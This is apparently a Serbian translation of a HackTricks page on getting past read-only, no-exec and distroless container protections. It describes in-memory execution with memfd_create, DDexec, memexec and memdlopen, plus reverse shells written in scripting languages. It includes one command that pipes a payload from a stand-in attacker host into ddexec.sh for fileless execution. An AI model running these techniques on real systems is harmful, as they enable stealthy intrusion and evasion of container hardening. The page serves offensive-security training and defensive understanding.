# Bypass FS zaštite: samo za čitanje / bez izvršavanja / Distroless

{{#include ../../../banners/hacktricks-training.md}}


## Video

U sledećim video zapisima možete pronaći tehnike pomenute na ovoj stranici objašnjene detaljnije:

- [**DEF CON 31 - Istraživanje manipulacije Linux memorijom za prikrivenost i izbegavanje**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**Prikriveni upadi sa DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## scenario samo za čitanje / bez izvršavanja

Sve je češće pronaći linux mašine montirane sa **zaštitom datotečnog sistema samo za čitanje (ro)**, posebno u kontejnerima. To je zato što je pokretanje kontejnera sa ro datotečnim sistemom jednako lako kao postavljanje **`readOnlyRootFilesystem: true`** u `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Međutim, čak i ako je datotečni sistem montiran kao ro, **`/dev/shm`** će i dalje biti zapisiv, tako da je lažno da ne možemo ništa napisati na disk. Međutim, ova fascikla će biti **montirana sa zaštitom bez izvršavanja**, tako da ako preuzmete binarni fajl ovde, **nećete moći da ga izvršite**.

> [!WARNING]
> Sa perspektive crvenog tima, ovo otežava **preuzimanje i izvršavanje** binarnih fajlova koji već nisu u sistemu (kao što su backdoor-i ili enumeratori poput `kubectl`).

## Najlakši zaobilaženje: Skripte

Napomena da sam pomenuo binarne fajlove, možete **izvršiti bilo koju skriptu** sve dok je interpreter unutar mašine, kao što je **shell skripta** ako je `sh` prisutan ili **python** **skripta** ako je `python` instaliran.

Međutim, ovo nije dovoljno samo za izvršavanje vašeg binarnog backdoora ili drugih binarnih alata koje možda treba da pokrenete.

## Zaobilaženja memorije

Ako želite da izvršite binarni fajl, ali datotečni sistem to ne dozvoljava, najbolji način da to uradite je **izvršavanje iz memorije**, jer se **zaštite ne primenjuju tamo**.

### FD + exec syscall zaobilaženje

Ako imate neke moćne skriptne engine unutar mašine, kao što su **Python**, **Perl** ili **Ruby**, mogli biste preuzeti binarni fajl za izvršavanje iz memorije, sačuvati ga u deskriptoru datoteke u memoriji (`create_memfd` syscall), koji neće biti zaštićen tim zaštitama, a zatim pozvati **`exec` syscall** označavajući **fd kao datoteku za izvršavanje**.

Za ovo možete lako koristiti projekat [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Možete mu proslediti binarni fajl i on će generisati skriptu u naznačenom jeziku sa **binarom kompresovanim i b64 kodiranim** sa uputstvima za **dekodiranje i dekompresiju** u **fd** kreiranom pozivom `create_memfd` syscall i pozivom na **exec** syscall da ga pokrene.

> [!WARNING]
> Ovo ne funkcioniše u drugim skriptnim jezicima poput PHP-a ili Node-a jer nemaju nikakav **podrazumevani način da pozovu sirove syscalls** iz skripte, tako da nije moguće pozvati `create_memfd` da kreira **memory fd** za čuvanje binarnog fajla.
>
> Štaviše, kreiranje **običnog fd** sa datotekom u `/dev/shm` neće raditi, jer nećete moći da ga pokrenete jer će se primeniti **zaštita bez izvršavanja**.

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) je tehnika koja vam omogućava da **modifikujete memoriju vašeg vlastitog procesa** prepisivanjem njegovog **`/proc/self/mem`**.

Dakle, **kontrolišući asemblažni kod** koji se izvršava od strane procesa, možete napisati **shellcode** i "mutirati" proces da **izvrši bilo koji proizvoljni kod**.

> [!TIP]
> **DDexec / EverythingExec** će vam omogućiti da učitate i **izvršite** svoj **shellcode** ili **bilo koji binarni fajl** iz **memorije**.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Za više informacija o ovoj tehnici proverite Github ili:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) je prirodan sledeći korak DDexec-a. To je **DDexec shellcode demonizovan**, tako da svaki put kada želite da **pokrenete drugi binarni fajl** ne morate ponovo pokretati DDexec, možete jednostavno pokrenuti memexec shellcode putem DDexec tehnike i zatim **komunicirati sa ovim demonima da prenesete nove binarne fajlove za učitavanje i izvršavanje**.

Možete pronaći primer kako koristiti **memexec za izvršavanje binarnih fajlova iz PHP reverzne ljuske** na [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Sa sličnom svrhom kao DDexec, tehnika [**memdlopen**](https://github.com/arget13/memdlopen) omogućava **lakši način učitavanja binarnih fajlova** u memoriju za kasnije izvršavanje. Može čak omogućiti i učitavanje binarnih fajlova sa zavisnostima.

## Distroless Bypass

### Šta je distroless

Distroless kontejneri sadrže samo **najosnovnije komponente potrebne za pokretanje specifične aplikacije ili servisa**, kao što su biblioteke i zavisnosti u vreme izvršavanja, ali isključuju veće komponente poput menadžera paketa, ljuske ili sistemskih alata.

Cilj distroless kontejnera je da **smanji površinu napada kontejnera eliminisanjem nepotrebnih komponenti** i minimiziranjem broja ranjivosti koje se mogu iskoristiti.

### Reverzna ljuska

U distroless kontejneru možda **nećete ni pronaći `sh` ili `bash`** da dobijete regularnu ljusku. Takođe nećete pronaći binarne fajlove kao što su `ls`, `whoami`, `id`... sve što obično pokrećete u sistemu.

> [!WARNING]
> Stoga, **nećete** moći da dobijete **reverznu ljusku** ili **enumerišete** sistem kao što obično radite.

Međutim, ako kompromitovani kontejner pokreće, na primer, flask web, tada je python instaliran, i stoga možete dobiti **Python reverznu ljusku**. Ako pokreće node, možete dobiti Node rev shell, i isto važi za većinu **scripting jezika**.

> [!TIP]
> Koristeći scripting jezik mogli biste **enumerisati sistem** koristeći mogućnosti jezika.

Ako nema **`read-only/no-exec`** zaštita mogli biste iskoristiti vašu reverznu ljusku da **pišete u fajl sistem vaše binarne fajlove** i **izvršavate** ih.

> [!TIP]
> Međutim, u ovakvim kontejnerima ove zaštite obično postoje, ali mogli biste koristiti **prethodne tehnike izvršavanja u memoriji da ih zaobiđete**.

Možete pronaći **primere** o tome kako da **iskoristite neke RCE ranjivosti** da dobijete scripting jezike **reverzne ljuske** i izvršavate binarne fajlove iz memorije na [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).

{{#include ../../../banners/hacktricks-training.md}}
